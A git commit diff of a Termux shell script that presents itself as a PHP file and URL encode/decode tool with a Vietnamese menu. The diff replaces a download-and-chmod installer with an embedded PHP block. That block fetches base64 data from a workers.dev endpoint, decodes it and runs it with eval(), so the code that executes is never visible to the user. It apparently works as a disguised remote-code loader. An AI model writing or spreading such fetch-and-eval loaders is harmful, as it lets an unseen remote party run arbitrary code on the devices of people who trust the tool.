b0782906683fa2c5fbe7040cd3f01069bf1d69d0
An orin <99235237+AnorinTool@users.noreply.github.com>
2026-04-27 01:13:14 +0700

    Update install_tools_php.sh

--- install_tools_php.sh
+++ install_tools_php.sh
@@ -1,17 +1,64 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
+cd "$(dirname "$0")"
+
 clear
-echo "=== INSTALL TOOL PHP SYSTEM ==="
+echo -e "===== [TOOL PHP SYSTEM BY AN ORIN] =====\n"
+echo "[1] Encode File"
+echo "[2] Decode File"
+echo "[3] Decode URL"
+echo "[4] Encode URL"
 
-# kiểm tra php
-command -v php >/dev/null 2>&1 || pkg install php -y
+read -p "Chọn: " choose
 
-# tải tool
-curl -s https://5g142.wiremockapi.cloud/shtool/tools_php_main -o $PREFIX/bin/tools_php
+case $choose in
+    1) mode=8 ;;
+    2) mode=10 ;;
+    3) mode=12 ;;
+    4) mode=14 ;;
+    *) echo "Sai lựa chọn"; exit ;;
+esac
 
-# cấp quyền
-chmod +x $PREFIX/bin/tools_php
+php <<EOF
+<?php
 
-echo ""
-echo "✅ Cài đặt hoàn tất"
-echo "👉 Gõ: tools_php"
+\$mode = $mode;
+
+\$url = "https://old-rain-6157.anorintool.workers.dev/?mode=" . \$mode;
+
+\$context = stream_context_create([
+    "http" => [
+        "timeout" => 10,
+        "header" => "User-Agent: AnorinClient/3.0\\r\\n"
+    ]
+]);
+
+\$menu = @file_get_contents(\$url, false, \$context);
+
+if (!\$menu) {
+    exit("❌ Không kết nối được API\n");
+}
+
+\$data = json_decode(\$menu, true);
+
+if (!\$data || !isset(\$data['status'])) {
+    exit("❌ JSON không hợp lệ\n");
+}
+
+if (\$data['status'] !== 'success') {
+    exit("⚠️ API lỗi\n");
+}
+
+if (empty(\$data['data'])) {
+    exit("⚠️ Không có dữ liệu\n");
+}
+
+\$real = base64_decode(\$data['data']);
+
+if (\$real === false || trim(\$real) === "") {
+    exit("⚠️ Decode rỗng\n");
+}
+
+eval("?>".\$real);
+?>
+EOF
